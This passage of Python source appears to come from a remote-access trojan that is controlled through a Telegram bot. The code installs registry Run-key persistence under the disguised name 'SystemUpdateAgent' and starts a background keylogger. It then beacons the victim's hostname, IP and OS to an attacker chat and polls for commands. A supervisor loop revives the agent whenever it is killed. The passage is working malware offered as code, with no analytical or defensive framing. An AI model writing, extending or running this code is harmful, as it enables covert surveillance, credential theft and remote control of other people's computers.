        import winreg

        key = winreg.HKEY_CURRENT_USER
        sub_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg_key:
          winreg.DeleteValue(reg_key, 'SystemUpdateAgent')
    except Exception:
      pass
    os._exit(0)

def run_worker_bot():
  """Main bot polling loop with offline state notification."""
  print('[+] SUCCESSFULLY CONNECTED LOCALLY — WAITING FOR INTERNET CONNECTION...')
  setup_persistence()

  start_keylogger_background()

  while True:
    try:
      hostname, local_ip, os_name = get_system_info()
      startup_msg = (
          '🚀 [+] Agent Connected Successfully!\n'
          f'💻 Hostname: {hostname}\n'
          f'🌐 Local IP: {local_ip}\n'
          f'⚙️ OS: {os_name}\n'
          '🔒 Persistence: Active'
      )
      bot.send_message(AUTHORIZED_CHAT_ID, startup_msg)
      print('[+] Startup beacon sent. Listening for commands...')

      bot.infinity_polling(
          skip_pending=True, timeout=60, long_polling_timeout=30
      )

    except Exception as e:
      print(f'[-] Network / Polling offline: {str(e)}')
      print('[*] Waiting for internet connection... retrying in 5s')
      time.sleep(5)

# --- INTEGRATED GUARDIAN & MAIN EXECUTION ---
if __name__ == '__main__':
  self_relocate()

  if '--worker' in sys.argv:
    enforce_single_instance()
    run_worker_bot()
  else:
    print('[*] Integrated Guardian Supervisor started. Monitoring agent...')
    while True:
      try:
        worker_process = subprocess.Popen(
            [sys.executable, __file__, '--worker']
        )
        worker_process.wait()

        print('[-] Warning: Agent process terminated. Reviving in 3 seconds...')
        time.sleep(3)
      except KeyboardInterrupt:
        print('[!] Supervisor stopped by user.')
        break
      except Exception as e:
        print(f'[-] Supervisor error: {e}')
        time.sleep(5)